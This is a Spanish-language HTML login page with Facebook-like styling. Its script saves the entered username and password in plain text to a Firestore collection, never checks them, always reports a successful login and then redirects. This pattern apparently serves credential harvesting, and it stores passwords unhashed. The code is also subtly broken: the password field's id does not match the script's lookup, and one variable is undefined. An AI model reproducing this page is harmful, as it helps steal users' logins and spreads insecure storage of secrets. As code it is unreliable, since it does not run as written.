<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mi formulario</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .contenedor {
            background: white;
            width: 350px;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }

        h1 {
            text-align: center;
            color: #1877f2;
        }

        input {
            width: 100%;
            box-sizing: border-box;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 6px;
            background: #1877f2;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background: #145dbf;
        }

        #mensaje {
            text-align: center;
            margin-top: 15px;
        }
    </style>
</head>

<body>

<div class="contenedor">

    <h1>Mi aplicación</h1>

    <h3>iniciar sesion</h3>

    <input
        type="text"
        id="usuario"
        placeholder="Usuario"
    >

    <input
        type="password"
        id="Contraseña"
        placeholder="Contraseña"
    >

    <button onclick="enviarFormulario()">
        Ingresar
    </button>

    <p id="mensaje"></p>

</div>

<script type="module">

    import {
        db,
        collection,
        addDoc,
        serverTimestamp
    } from "./firebase.js";


    window.enviarFormulario = async function() {

        const usuario =
            document.getElementById("usuario").value;

        const password =
            document.getElementById("password").value;


        if (!usuario || !password) {

            document.getElementById("mensaje").textContent =
                "Completa todos los campos.";

            return;
        }


        try {

            await addDoc(
                collection(db, "registros"),
                {

                    usuario: usuario,

                    Contraseña: Contraseña,

                    fecha: serverTimestamp()

                }
            );


            document.getElementById("mensaje").textContent =
                "inisio de sesion correcto.";


            setTimeout(() => {

                window.location.href = "inicio.html";

            }, 1000);


        } catch (error) {

            console.error(error);

            document.getElementById("mensaje").textContent =
                "Ocurrió un error al guardar la información.";

        }

    };

</script>

</body>
</html>
